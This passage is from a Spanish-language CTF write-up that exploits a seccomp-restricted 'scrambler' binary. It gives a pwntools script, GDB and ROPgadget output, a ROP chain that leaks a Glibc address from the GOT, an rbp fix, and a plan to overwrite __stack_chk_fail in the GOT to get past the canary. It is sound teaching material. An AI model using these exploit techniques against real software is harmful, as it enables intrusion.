</code></pre></div><p>Perfecto, ahora podemos empezar a pensar en qué hacer para explotar el binario.</p><p>Como el objetivo es leer la <em>flag</em> y estamos limitados por las reglas <code>seccomp</code>, estas serán las instrucciones que tenemos que ejecutar para completar el reto:</p><ul><li><code>open("/home/ctf/flag.txt", O_RDONLY)</code></li><li><code>read(fd, buffer, length)</code></li><li><code>puts(buffer)</code></li></ul><p>También, recordemos que NX está habilitado, por lo que tenemso que usar ROP para ejecutar código arbitrario. Al tener que introducir <code>"/home/ctf/flag.txt"</code>, tenemos que encontrar un <em>gadget</em> como <code>mov qword ptr [rax], rdi; ret</code>, ya que no tenemos otra manera de introducir texto en el programa. El binario no tiene este tipo de <em>gadgets</em>, pero Glibc sí. Por tanto, el primer paso será fugar una dirección de Glibc para eludir ASLR y usar <em>offsets</em> a los <em>gadgets</em>.</p><p>Genial, vamos a empezar a escribir el <em>exploit</em>. Esto es lo que tenemos de momento:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk3>#!/usr/bin/env</span> <span class=mtk3>python3</span>

<span class=mtk5>from</span> <span class="mtk8 mtku">pwn</span> <span class=mtk5>import</span> <span class=mtk1>context</span><span class=mtk1>,</span> <span class="mtk8 mtku">ELF</span><span class=mtk1>,</span> <span class=mtk1>log</span><span class=mtk1>,</span> <span class=mtk1>p64,</span> <span class="mtk8 mtku">remote</span><span class=mtk1>,</span> <span class="mtk8 mtku">sys</span><span class=mtk1>,</span> <span class=mtk1>u64</span>

<span class=mtk1>elf</span> <span class=mtk5>=</span> <span class="mtk8 mtku">ELF</span><span class=mtk1>(</span><span class=mtk4>'scrambler_patched'</span><span class=mtk1>)</span>
<span class=mtk1>glibc</span> <span class=mtk5>=</span> <span class="mtk8 mtku">ELF</span><span class=mtk1>(</span><span class=mtk4>'libc.so_1.6'</span><span class=mtk1>,</span> <span class="mtk9 mtki">checksec</span><span class=mtk5>=</span><span class=mtk6>False</span><span class=mtk1>)</span>

<span class=mtk1>context</span><span class=mtk1>.</span><span class=mtk1>binary</span> <span class=mtk5>=</span> <span class=mtk1>elf</span>


<span class="mtk7 mtki">def</span> <span class=mtk8>get_process</span><span class=mtk1>():</span>
    <span class=mtk5>if</span> <span class=mtk8>len</span><span class=mtk1>(</span><span class="mtk8 mtku">sys</span><span class=mtk1>.</span><span class=mtk1>argv</span><span class=mtk1>)</span> <span class=mtk5>==</span> <span class=mtk6>1</span><span class=mtk1>:</span>
        <span class=mtk5>return</span> <span class=mtk1>elf</span><span class=mtk1>.</span><span class=mtk8>process</span><span class=mtk1>()</span>

    <span class=mtk1>host</span><span class=mtk1>,</span> <span class=mtk1>port</span> <span class=mtk5>=</span> <span class="mtk8 mtku">sys</span><span class=mtk1>.</span><span class=mtk1>argv</span><span class=mtk1>[</span><span class=mtk6>1</span><span class=mtk1>],</span> <span class="mtk8 mtku">sys</span><span class=mtk1>.</span><span class=mtk1>argv</span><span class=mtk1>[</span><span class=mtk6>2</span><span class=mtk1>]</span>
    <span class=mtk5>return</span> <span class="mtk8 mtku">remote</span><span class=mtk1>(</span><span class=mtk1>host</span><span class=mtk1>,</span> <span class="mtk8 mtku">int</span><span class=mtk1>(</span><span class=mtk1>port</span><span class=mtk1>))</span>


<span class="mtk7 mtki">def</span> <span class=mtk8>write_what_where</span><span class=mtk1>(</span><span class="mtk9 mtki">p</span><span class=mtk1>,</span> <span class="mtk9 mtki">what</span><span class=mtk1>:</span> <span class="mtk8 mtku">int</span><span class=mtk1>,</span> <span class="mtk9 mtki">where</span><span class=mtk1>:</span> <span class="mtk8 mtku">int</span><span class=mtk1>):</span>
    <span class="mtk9 mtki">p</span><span class=mtk1>.sendlineafter(</span><span class="mtk7 mtki">b</span><span class=mtk4>'&gt;</span> <span class=mtk4>'</span><span class=mtk1>,</span> <span class="mtk7 mtki">b</span><span class=mtk4>'1'</span><span class=mtk1>)</span>
    <span class="mtk9 mtki">p</span><span class=mtk1>.sendlineafter(</span><span class="mtk7 mtki">b</span><span class=mtk4>'arg1</span> <span class=mtk4>=</span> <span class=mtk6>\n</span><span class=mtk4>&gt;</span> <span class=mtk4>'</span><span class=mtk1>,</span> <span class="mtk7 mtki">b</span><span class=mtk4>'1'</span><span class=mtk1>)</span>
    <span class="mtk9 mtki">p</span><span class=mtk1>.sendlineafter(</span><span class="mtk7 mtki">b</span><span class=mtk4>'arg2</span> <span class=mtk4>=</span> <span class=mtk6>\n</span><span class=mtk4>&gt;</span> <span class=mtk4>'</span><span class=mtk1>,</span> <span class="mtk8 mtku">str</span><span class=mtk1>(</span><span class="mtk9 mtki">where</span><span class=mtk1>).</span><span class=mtk8>encode</span><span class=mtk1>())</span>  
    <span class="mtk9 mtki">p</span><span class=mtk1>.sendlineafter(</span><span class="mtk7 mtki">b</span><span class=mtk4>'arg3</span> <span class=mtk4>=</span> <span class=mtk6>\n</span><span class=mtk4>&gt;</span> <span class=mtk4>'</span><span class=mtk1>,</span> <span class="mtk8 mtku">str</span><span class=mtk1>(</span><span class="mtk9 mtki">what</span><span class=mtk1>).</span><span class=mtk8>encode</span><span class=mtk1>())</span>


<span class="mtk7 mtki">def</span> <span class=mtk8>main</span><span class=mtk1>():</span>
    <span class=mtk1>p</span> <span class=mtk5>=</span> <span class=mtk8>get_process</span><span class=mtk1>()</span>

    <span class=mtk8>write_what_where</span><span class=mtk1>(</span><span class=mtk1>p</span><span class=mtk1>,</span> <span class="mtk7 mtki">0x</span><span class=mtk6>80</span><span class=mtk1>,</span> <span class=mtk5>-</span><span class=mtk6>1</span><span class=mtk1>)</span>

    <span class=mtk1>flag</span> <span class=mtk5>=</span> <span class="mtk7 mtki">b</span><span class=mtk4>'/home/ctf/flag.txt'</span>

    <span class=mtk1>p</span><span class=mtk1>.</span><span class=mtk8>interactive</span><span class=mtk1>()</span>


<span class=mtk5>if</span> <span class=mtk1>__name__</span> <span class=mtk5>==</span> <span class=mtk4>'__main__'</span><span class=mtk1>:</span>
    <span class=mtk8>main</span><span class=mtk1>()</span>
</code></pre></div><p>Con este código, tenemos intentos de &ldquo;<em>scramble</em>&rdquo; ilimitados. La función <code>write_what_where</code> implementa la explicación anterior de la primitiva.</p><p>Ahora tenemos que descubrir si podemos modificar la dirección de retorno y tomar control del flujo de ejecución del programa al salir del bucle <code>while</code> (con la opción <code>2</code>).</p><p>Una manera de hacerlo es saber que estamos escribiendo usando <code>$rbp - 0x20</code> como dirección base. Como el binario es de 64 bits, la experiencia nos dice que la dirección de retorno guardada en la pila está en <code>$rbp + 8</code>, por lo que necesitamos un <em>offset</em> de <code>0x28</code> para modificar la dirección de retorno.</p><p>Si no se tiene suficiente experiencia, podemos usar GDB para encontrar el <em>offset</em>. Estas son las límes que se ejecutan al poner la opción <code>2</code>:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>40152a:       48 8d 3d 18 0b 00 00    lea    rdi,[rip+0xb18]        # 402049 &lt;rand@plt+0xec9&gt;  
401531:       e8 ca fb ff ff          call   401100 &lt;puts@plt&gt;
401536:       90                      nop
401537:       b8 00 00 00 00          mov    eax,0x0
40153c:       48 8b 4d e8             mov    rcx,QWORD PTR [rbp-0x18]
401540:       64 48 33 0c 25 28 00    xor    rcx,QWORD PTR fs:0x28
401547:       00 00
401549:       74 05                   je     401550 &lt;rand@plt+0x3d0&gt;
40154b:       e8 d0 fb ff ff          call   401120 &lt;__stack_chk_fail@plt&gt;
401550:       48 83 c4 48             add    rsp,0x48
401554:       5b                      pop    rbx
401555:       5d                      pop    rbp
401556:       c3                      ret
</code></pre></div><p>Podemos poner un <em>breakpoint</em> en <code>0x401555</code> (justo antes de <code>pop rbp</code>) para ver la dirección de retorno y <code>$rbp</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>gdb</span> -q <span class=mtku>scrambler_patched</span>
Reading symbols from <span class=code-dark-green>scrambler_patched</span>...
(No debugging symbols found in <span class=code-dark-green>scrambler_patched</span>)  
<span class=code-red>gef➤</span>  break *0x401555
Breakpoint 1 at 0x401555
<span class=code-red>gef➤</span>  run
Starting program: ./scrambler_patched
1) Try scrambling
2) Quit
&gt; 2
Good bye!

Breakpoint 1, <span class=code-dark-blue>0x0000000000401555</span> in <span class=code-dark-yellow>??</span> ()
</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>gef➤</span>  p/x $rbp
$1 = 0x7fffffffe730
<span class=code-green>gef➤</span>  x/10gx $rsp
<span class=code-dark-blue>0x7fffffffe730</span>: 0x0000000000000000      0x00007ffff7dc40b3  
<span class=code-dark-blue>0x7fffffffe740</span>: 0x00007ffff7ffc620      0x00007fffffffe828
<span class=code-dark-blue>0x7fffffffe750</span>: 0x0000000100000000      0x00000000004013c2
<span class=code-dark-blue>0x7fffffffe760</span>: 0x0000000000401560      0x2f62a629e826bd42
<span class=code-dark-blue>0x7fffffffe770</span>: 0x0000000000401190      0x00007fffffffe820
</code></pre></div><p>Entonces, la dirección de retorno es <code>0x00007ffff7dc40b3</code> (de <code>__libc_start_main</code>), que está en <code>0x7fffffffe738</code> (<code>$rbp + 8</code>, como era de esperar).</p><p>Nótese que <code>$rbp</code> será puesto a <code>0</code>. Esto será un problema que me llevó mucho tiempo arreglar.</p><p>Vamos a continuar de momento. Ahora sabemos dónde escribir para modificar la dirección de retorno. por lo que podemos empezar a crear una ROP <em>chain</em> sencilla para fugar una dirección de Glibc.</p><p>Esta vez no explicaré los conceptos tras esta técnica. Si necesitas más información, puedes ver otros retos como <a href=../../htb-challenges/pwn/ropme>ropme</a> o <a href=../../picoctf/binary-exploitation/heres-a-libc>Here&rsquo;s a LIBC</a> para ver una explicación más detallada. La idea principal es llamar a <code>puts</code> usando la PLT poniendo la dirección de <code>puts</code> en la GOT como primer argumento (que irá en <code>$rdi</code>), de manera que <code>puts</code> imprima el contenido de esa dirección de la GOT, que será la dirección real de <code>puts</code> en Glibc en tiempo de ejecución.</p><p>Podemos conseguir el <em>gadget</em> <code>pop rdi; ret</code> con <code>ROPgadget</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>ROPgadget</span> --binary <span class=mtku>scrambler</span> | <span class=code-dark-green>grep</span> <span class=code-dark-yellow>': pop rdi ; ret$'</span>  
0x00000000004015c3 <span class=code-red>: pop rdi ; ret</span>
</code></pre></div><p>Perfecto, esta es la función <code>main</code> del <em>exploit</em>:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class="mtk7 mtki">def</span> <span class=mtk8>main</span><span class=mtk1>():</span>
    <span class=mtk1>p</span> <span class=mtk5>=</span> <span class=mtk8>get_process</span><span class=mtk1>()</span>

    <span class=mtk1>pop_rdi_ret</span> <span class=mtk5>=</span> <span class="mtk7 mtki">0x</span><span class=mtk6>4015c3</span>
    <span class=mtk1>while_addr</span>  <span class=mtk5>=</span> <span class="mtk7 mtki">0x</span><span class=mtk6>401400</span>

    <span class=mtk1>payload</span>  <span class=mtk5>=</span> <span class=mtk1>p64(</span><span class=mtk1>pop_rdi_ret</span><span class=mtk1>)</span>
    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p64(</span><span class=mtk1>elf</span><span class=mtk1>.</span><span class=mtk1>got</span><span class=mtk1>.puts)</span>
    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p64(</span><span class=mtk1>elf</span><span class=mtk1>.</span><span class=mtk1>plt</span><span class=mtk1>.puts)</span>
    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p64(</span><span class=mtk1>while_addr</span><span class=mtk1>)</span>

    <span class=mtk8>write_what_where</span><span class=mtk1>(</span><span class=mtk1>p</span><span class=mtk1>,</span> <span class="mtk7 mtki">0x</span><span class=mtk6>80</span><span class=mtk1>,</span> <span class=mtk5>-</span><span class=mtk6>1</span><span class=mtk1>)</span>

    <span class=mtk5>for</span> <span class=mtk1>i</span><span class=mtk1>,</span> <span class=mtk1>b</span> <span class=mtk5>in</span> <span class="mtk8 mtku">enumerate</span><span class=mtk1>(</span><span class=mtk1>payload</span><span class=mtk1>):</span>
        <span class=mtk8>write_what_where</span><span class=mtk1>(</span><span class=mtk1>p</span><span class=mtk1>,</span> <span class=mtk1>b</span><span class=mtk1>,</span> <span class="mtk7 mtki">0x</span><span class=mtk6>20</span> <span class=mtk5>+</span> <span class=mtk6>8</span> <span class=mtk5>+</span> <span class=mtk1>i</span><span class=mtk1>)</span>

    <span class=mtk1>p</span><span class=mtk1>.</span><span class=mtk8>sendlineafter</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'&gt;</span> <span class=mtk4>'</span><span class=mtk1>,</span> <span class="mtk7 mtki">b</span><span class=mtk4>'2'</span><span class=mtk1>)</span>
    <span class=mtk1>p</span><span class=mtk1>.</span><span class=mtk8>recvline</span><span class=mtk1>()</span>
    <span class=mtk1>puts_addr</span> <span class=mtk5>=</span> <span class=mtk1>u64(</span><span class=mtk1>p</span><span class=mtk1>.</span><span class=mtk8>recvline</span><span class=mtk1>().</span><span class=mtk8>strip</span><span class=mtk1>().</span><span class=mtk8>ljust</span><span class=mtk1>(</span><span class=mtk6>8</span><span class=mtk1>,</span> <span class="mtk7 mtki">b</span><span class=mtk4>'</span><span class=mtk6>\0</span><span class=mtk4>'</span><span class=mtk1>))</span>  

    <span class=mtk1>log</span><span class=mtk1>.</span><span class=mtk8>info</span><span class=mtk1>(</span><span class="mtk7 mtki">f</span><span class=mtk4>'Leaked</span> <span class=mtk4>puts()</span> <span class=mtk4>address:</span> <span class=mtk6>{</span><span class=mtk8>hex</span><span class=mtk1>(</span><span class=mtk1>puts_addr</span><span class=mtk1>)</span><span class=mtk6>}</span><span class=mtk4>'</span><span class=mtk1>)</span>

    <span class=mtk1>p</span><span class=mtk1>.</span><span class=mtk8>interactive</span><span class=mtk1>()</span>
</code></pre></div><p>Si lo ejecutamos, obtenemos la fuga de memoria:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> <span class=mtku>solve.py</span>
[<span class=code-blue>*</span>] './scrambler_patched'
    Arch:     amd64-64-little
    RELRO:    <span class=code-dark-yellow>Partial RELRO</span>
    Stack:    <span class=code-dark-green>Canary found</span>
    NX:       <span class=code-dark-green>NX enabled</span>
    PIE:      <span class=code-dark-red>No PIE (0x3ff000)</span>
    RUNPATH:  <span class=code-dark-red>b'.'</span>
[<span class=code-green>+</span>] Starting local process './scrambler_patched': pid 350738  
[<span class=code-blue>*</span>] Leaked puts() address: 0x7f80e640d450
[<span class=code-blue>*</span>] Switching to interactive mode
1) Try scrambling
2) Quit
[<span class=code-blue>*</span>] Got EOF while reading in interactive
<span class=code-red>$</span>
</code></pre></div><p>Nótese que hemos usado <code>0x401400</code> como siguiente dirección a retornar, que es el comienzo del bucle <code>while</code>. No podemos llamar al <code>main</code> porque las reglas <code>seccomp</code> ya están aplicadas, y hay algunas configuraciones con <code>setvbuf</code> que ya no están permitidas.</p><p>Vamos a calcular la dirección base de Glibc.</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>    <span class=mtk1>glibc</span><span class=mtk1>.</span><span class=mtk1>address</span> <span class=mtk5>=</span> <span class=mtk1>puts_addr</span> <span class=mtk5>-</span> <span class=mtk1>glibc</span><span class=mtk1>.</span><span class=mtk1>sym</span><span class=mtk1>.puts</span>
    <span class=mtk1>log</span><span class=mtk1>.</span><span class=mtk8>info</span><span class=mtk1>(</span><span class="mtk7 mtki">f</span><span class=mtk4>'Glibc</span> <span class=mtk4>base</span> <span class=mtk4>address:</span> <span class=mtk6>{</span><span class=mtk8>hex</span><span class=mtk1>(</span><span class=mtk1>glibc</span><span class=mtk1>.</span><span class=mtk1>address</span><span class=mtk1>)</span><span class=mtk6>}</span><span class=mtk4>'</span><span class=mtk1>)</span>  
</code></pre></div><p>Ahora tenemos la dirección base, que parece correcta porque termina en <code>000</code> en hexadecimal:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> <span class=mtku>solve.py</span>
[<span class=code-blue>*</span>] './scrambler_patched'
    Arch:     amd64-64-little
    RELRO:    <span class=code-dark-yellow>Partial RELRO</span>
    Stack:    <span class=code-dark-green>Canary found</span>
    NX:       <span class=code-dark-green>NX enabled</span>
    PIE:      <span class=code-dark-red>No PIE (0x3ff000)</span>
    RUNPATH:  <span class=code-dark-red>b'.'</span>
[<span class=code-green>+</span>] Starting local process './scrambler_patched': pid 353240  
[<span class=code-blue>*</span>] Leaked puts() address: 0x7f4119ab8450
[<span class=code-blue>*</span>] Glibc base address: 0x7f4119a34000
[<span class=code-blue>*</span>] Switching to interactive mode
1) Try scrambling
2) Quit
[<span class=code-blue>*</span>] Got EOF while reading in interactive
<span class=code-red>$</span>
</code></pre></div><p>Perfecto. Pero tenemos un problema. Nos dice &ldquo;<em>EOF while reading in interactive</em>&rdquo;, por lo que el programa se ha roto. Y esto es porque <code>$rbp</code> está en <code>0</code> cuando se retorna del <code>main</code>. Y como no podemos llamar al <code>main</code> desde el principio, no podemos poner ne <code>$rbp</code> su valor inicial.</p><p>Cuando hice el reto, no me di cuenta de esto y continué con la siguiente ROP <em>chain</em> para leer la <em>flag</em>. Pero luego me di cuenta de que necesitaba resolver el problema de <code>$rbp</code> antes.</p><p>Tenemos que hacer algo con <code>$rbp</code>, y solamente tenemos el binario (ya que Glibc no está fugado al crear la primera ROP <em>chain</em>). El objetivo es redirigir el flujo de ejecución del programa al bucle <code>while</code>, pero con un valor de <code>$rbp</code> válido (y no <code>0</code>). Lo único que podemos hacer es buscar <em>gadgets</em> que involucren a <code>$rbp</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>ROPgadget</span> --binary <span class=mtku>scrambler</span> | <span class=code-dark-green>grep</span> ret$ | <span class=code-dark-green>grep</span> rbp
0x000000000040125a : add byte ptr [rax], al ; add dword ptr [<span class=code-red>rbp</span> - 0x3d], ebx ; nop ; ret
0x000000000040125b : add byte ptr [rcx], al ; pop <span class=code-red>rbp</span> ; ret
0x0000000000401259 : add byte ptr cs:[rax], al ; add dword ptr [<span class=code-red>rbp</span> - 0x3d], ebx ; nop ; ret
0x000000000040125c : add dword ptr [<span class=code-red>rbp</span> - 0x3d], ebx ; nop ; ret
0x0000000000401257 : add eax, 0x2e4b ; add dword ptr [<span class=code-red>rbp</span> - 0x3d], ebx ; nop ; ret
0x00000000004013b8 : add eax, edx ; mov dword ptr [<span class=code-red>rbp</span> - 4], eax ; mov eax, dword ptr [<span class=code-red>rbp</span> - 4] ; leave ; ret  
0x0000000000401551 : add esp, 0x48 ; pop rbx ; pop <span class=code-red>rbp</span> ; ret
0x0000000000401550 : add rsp, 0x48 ; pop rbx ; pop <span class=code-red>rbp</span> ; ret
0x00000000004013bc : cld ; mov eax, dword ptr [<span class=code-red>rbp</span> - 4] ; leave ; ret
0x0000000000401256 : mov byte ptr [rip + 0x2e4b], 1 ; pop <span class=code-red>rbp</span> ; ret
0x00000000004013ba : mov dword ptr [<span class=code-red>rbp</span> - 4], eax ; mov eax, dword ptr [<span class=code-red>rbp</span> - 4] ; leave ; ret
0x00000000004013bd : mov eax, dword ptr [<span class=code-red>rbp</span> - 4] ; leave ; ret
0x00000000004012d8 : nop ; pop <span class=code-red>rbp</span> ; ret
0x00000000004015bb : pop <span class=code-red>rbp</span> ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004015bf : pop <span class=code-red>rbp</span> ; pop r14 ; pop r15 ; ret
0x000000000040125d : pop <span class=code-red>rbp</span> ; ret
0x0000000000401554 : pop rbx ; pop <span class=code-red>rbp</span> ; ret
</code></pre></div><p>Hay un <em>gadget</em> que podemos usar para controlar <code>$rbp</code>, y es <code>pop rbp; ret</code>. Sería genial si tuviéramos una dirección de la pila para ponerla en <code>$rbp</code>, pero no podemos fugar direcciones en la primera ROP <em>chain</em> y usarlas para controlar <code>$rbp</code>.</p><p>Por tanto, probé a usar una dirección del propio binario:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>gef➤</span>  vmmap
[ Legend:  <span class=code-dark-red>Code</span> | <span class=code-dark-green>Heap</span> | <span class=code-dark-magenta>Stack</span> ]
<span class=code-dark-blue>Start              End                Offset             Perm Path</span>
0x000000003ff000 0x00000000400000 0x00000000000000 rw- ./scrambler_patched
0x00000000400000 0x00000000401000 0x00000000001000 r-- ./scrambler_patched
<span class=code-dark-red>0x00000000401000 0x00000000402000 0x00000000002000 r-x ./scrambler_patched</span>
0x00000000402000 0x00000000403000 0x00000000003000 r-- ./scrambler_patched
0x00000000403000 0x00000000404000 0x00000000003000 r-- ./scrambler_patched
0x00000000404000 0x00000000405000 0x00000000004000 rw- ./scrambler_patched
0x007ffff7d9d000 0x007ffff7da0000 0x00000000000000 rw-
0x007ffff7da0000 0x007ffff7dc2000 0x00000000000000 r-- ./libc.so_1.6
<span class=code-dark-red>0x007ffff7dc2000 0x007ffff7f3a000 0x00000000022000 r-x ./libc.so_1.6</span>
0x007ffff7f3a000 0x007ffff7f88000 0x0000000019a000 r-- ./libc.so_1.6
0x007ffff7f88000 0x007ffff7f8c000 0x000000001e7000 r-- ./libc.so_1.6
0x007ffff7f8c000 0x007ffff7f8e000 0x000000001eb000 rw- ./libc.so_1.6
0x007ffff7f8e000 0x007ffff7f92000 0x00000000000000 rw-
0x007ffff7f92000 0x007ffff7f94000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libseccomp.so.2.5.1  
<span class=code-dark-red>0x007ffff7f94000 0x007ffff7fa3000 0x00000000002000 r-x /usr/lib/x86_64-linux-gnu/libseccomp.so.2.5.1</span>
0x007ffff7fa3000 0x007ffff7fb1000 0x00000000011000 r-- /usr/lib/x86_64-linux-gnu/libseccomp.so.2.5.1
0x007ffff7fb1000 0x007ffff7fb2000 0x0000000001f000 --- /usr/lib/x86_64-linux-gnu/libseccomp.so.2.5.1
0x007ffff7fb2000 0x007ffff7fb3000 0x0000000001f000 r-- /usr/lib/x86_64-linux-gnu/libseccomp.so.2.5.1
0x007ffff7fb3000 0x007ffff7fb4000 0x00000000020000 rw- /usr/lib/x86_64-linux-gnu/libseccomp.so.2.5.1
0x007ffff7fb4000 0x007ffff7fb6000 0x00000000000000 rw-
0x007ffff7fc9000 0x007ffff7fcd000 0x00000000000000 r-- [vvar]
<span class=code-dark-red>0x007ffff7fcd000 0x007ffff7fcf000 0x00000000000000 r-x [vdso]</span>
0x007ffff7fcf000 0x007ffff7fd0000 0x00000000000000 r-- ./ld-2.31.so
<span class=code-dark-red>0x007ffff7fd0000 0x007ffff7ff3000 0x00000000001000 r-x ./ld-2.31.so</span>
0x007ffff7ff3000 0x007ffff7ffb000 0x00000000024000 r-- ./ld-2.31.so
0x007ffff7ffc000 0x007ffff7ffd000 0x0000000002c000 r-- ./ld-2.31.so
0x007ffff7ffd000 0x007ffff7ffe000 0x0000000002d000 rw- ./ld-2.31.so
0x007ffff7ffe000 0x007ffff7fff000 0x00000000000000 rw-
<span class=code-dark-magenta>0x007ffffffde000 0x007ffffffff000 0x00000000000000 rw- [stack]</span>
0xffffffffff600000 0xffffffffff601000 0x00000000000000 --x [vsyscall]
</code></pre></div><p>Necesitamos una dirección con permisos <code>rw-</code>, por lo que <code>0x404000</code> parece buena opción. Como el binario no tiene protección PIE, esta dirección será fija. No obstante, usé <code>0x404200</code> porque la GOT se almacena en <code>0x404000</code>, y no quería romperla.</p><p>Por tanto, tenemos que actualizar la ROP <em>chain</em>:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>    <span class=mtk1>pop_rdi_ret</span> <span class=mtk5>=</span> <span class="mtk7 mtki">0x</span><span class=mtk6>4015c3</span>
    <span class=mtk1>pop_rbp_ret</span> <span class=mtk5>=</span> <span class="mtk7 mtki">0x</span><span class=mtk6>40125d</span>
    <span class=mtk1>new_rbp</span>     <span class=mtk5>=</span> <span class="mtk7 mtki">0x</span><span class=mtk6>404200</span>
    <span class=mtk1>while_addr</span>  <span class=mtk5>=</span> <span class="mtk7 mtki">0x</span><span class=mtk6>401400</span>

    <span class=mtk1>payload</span>  <span class=mtk5>=</span> <span class=mtk1>p64(</span><span class=mtk1>pop_rdi_ret</span> <span class=mtk5>+</span> <span class=mtk6>1</span><span class=mtk1>)</span>  
    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p64(</span><span class=mtk1>pop_rdi_ret</span><span class=mtk1>)</span>
    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p64(</span><span class=mtk1>elf</span><span class=mtk1>.</span><span class=mtk1>got</span><span class=mtk1>.puts)</span>
    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p64(</span><span class=mtk1>elf</span><span class=mtk1>.</span><span class=mtk1>plt</span><span class=mtk1>.puts)</span>
    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p64(</span><span class=mtk1>pop_rbp_ret</span><span class=mtk1>)</span>
    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p64(</span><span class=mtk1>new_rbp</span><span class=mtk1>)</span>
    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p64(</span><span class=mtk1>while_addr</span><span class=mtk1>)</span>
</code></pre></div><p>Nótese que <code>pop_rdi_ret + 1</code> (un <em>gadget</em> <code>ret</code>) se necesita para prevenir problemas con el alineamiento de pila (<em>stack alignment</em>) en <code>printf</code>. Y conseguimos un proceso interactivo:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> <span class=mtku>solve.py</span>
[<span class=code-blue>*</span>] './scrambler_patched'
    Arch:     amd64-64-little
    RELRO:    <span class=code-dark-yellow>Partial RELRO</span>
    Stack:    <span class=code-dark-green>Canary found</span>
    NX:       <span class=code-dark-green>NX enabled</span>
    PIE:      <span class=code-dark-red>No PIE (0x3ff000)</span>
    RUNPATH:  <span class=code-dark-red>b'.'</span>
[<span class=code-green>+</span>] Starting local process './scrambler_patched': pid 363454  
[<span class=code-blue>*</span>] Leaked puts() address: 0x7f5d037c6450
[<span class=code-blue>*</span>] Glibc base address: 0x7f5d03742000
[<span class=code-blue>*</span>] Switching to interactive mode
1) Try scrambling
2) Quit
&gt; <span class=code-red>$</span> 1
arg1 =
&gt; <span class=code-red>$</span> 1
arg2 =
&gt; <span class=code-red>$</span> 1
arg3 =
&gt; <span class=code-red>$</span> 1
1) Try scrambling
2) Quit
&gt; <span class=code-red>$</span> 2
Good bye!
[<span class=code-blue>*</span>] Got EOF while reading in interactive
</code></pre></div><p>Sin embargo, tenemos otro problema relacionado con la protección del canario:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>40153c:       48 8b 4d e8             mov    rcx,QWORD PTR [rbp-0x18]
401540:       64 48 33 0c 25 28 00    xor    rcx,QWORD PTR fs:0x28
401547:       00 00
401549:       74 05                   je     401550 &lt;rand@plt+0x3d0&gt;
40154b:       e8 d0 fb ff ff          call   401120 &lt;__stack_chk_fail@plt&gt;  
401550:       48 83 c4 48             add    rsp,0x48
401554:       5b                      pop    rbx
401555:       5d                      pop    rbp
401556:       c3                      ret
401557:       66 0f 1f 84 00 00 00    nop    WORD PTR [rax+rax*1+0x0]
</code></pre></div><p>El programa está cogiendo el canario guardado mediante un <em>offset</em> a <code>$rbp</code>. Como hemos modificado <code>$rbp</code>, obviamente el valor que habrá en el <em>offset</em> no será igual al canario maestro (<code>fs:0x28</code>). Y entonces, el programa se cerrará inmediatemante (<code>__stack_shk_fail</code>).</p><p>Este problema viene al usar la opción <code>2</code> para ejecutar la segunda ROP <em>chain</em> (que será la que imprima la <em>flag</em>). Como tenemos una primitiva &ldquo;<em>write-what-where</em>&rdquo; y <code>$rbp</code> tiene una dirección del binario, podemos calcular un <em>offset</em> a la tabla GOT (nótese que el binario tiene RELRO parcial, por lo que podemos modificar la GOT en tiempo de ejecución).</p><p>La GOT es una tabla que contiene las direcciones reales de las funciones externas o punteros a otra tabla de resolución si la función aún no ha sido usada. El objetivo es modificar el valor de la entrada de <code>__stack_chk_fail</code>, para que, aunque el canario guardado no coincida con el canario maestro, el programa no termine porque <code>__stack_chk_fail</code> no será resuelta a la función <code>__stack_chk_fail</code> real.</p><p>Podemos 